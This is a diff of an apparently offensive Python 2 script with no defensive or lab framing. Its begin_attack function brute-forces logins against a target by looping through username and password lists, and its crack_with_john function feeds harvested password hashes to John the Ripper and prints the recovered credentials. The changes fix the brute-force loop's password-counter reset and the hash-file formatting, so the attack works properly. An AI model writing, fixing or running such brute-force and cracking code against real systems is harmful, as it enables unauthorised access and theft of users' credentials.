@@ -126,10 +126,11 @@ def begin_attack(client):
         log_root = False
         while (userN < user_len) and (not logged_in):
             userCred = USERNAMES[userN]
+            passwd = 0
             print "USER: %s" % userCred
             while (passwd < passwd_len) and (not logged_in):
                 passCred = PASSWORDS[passwd]
-                print "PASSWORD: %s" % passCred
+                print "%s : %s" % (userCred, passCred)
                 try:
                     if initial_comps > 0:
                         initial_comps -= 1
@@ -153,7 +154,6 @@ def begin_attack(client):
                     passwd += 1
 
             userN += 1
-            passwd = 0
 
         # if we have logged into the machine
         if logged_in:
@@ -226,7 +226,7 @@ def crack_with_john(hashes_lst):
     f = open("curr_hashes.txt", "w")
     # write each hash to the file so john can do its thingy thing
     for h in hashes_lst:
-        f.write(h)
+        f.write(str(h) + '\n')
     f.close()
 
     print "Cracking newly found hashes...\n"
@@ -236,6 +236,7 @@ def crack_with_john(hashes_lst):
     # get only the user/pass output from john
     hashes = subprocess.Popen("john --show curr_hashes.txt | grep ':'", shell=True, stdout=subprocess.PIPE).communicate()[0]
 
+    print hashes
     # split it into array
     hashes = hashes.split('\n')
     # for some reason subprocess.Popen adds a new line at the end of output
